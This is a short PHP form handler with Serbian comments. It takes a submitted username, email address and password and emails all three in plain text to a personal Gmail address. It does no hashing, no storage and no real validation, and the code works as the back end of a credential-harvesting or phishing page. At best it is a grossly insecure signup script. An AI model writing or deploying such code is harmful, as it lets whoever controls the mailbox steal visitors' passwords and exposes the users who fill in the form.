
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Validacija podataka, možete dodati dodatnu logiku validacije ovde

    // Slanje emaila
    $to = "brataleks96@gmail.com";
    $subject = "Nova forma poslata";
    $message = "Korisničko ime: $username\nImejl: $email\nŠifra: $password";
    $headers = "From: webmaster@example.com"; // Postavite ispravnu adresu pošiljaoca

    // Slanje emaila
    mail($to, $subject, $message, $headers);
}
?>
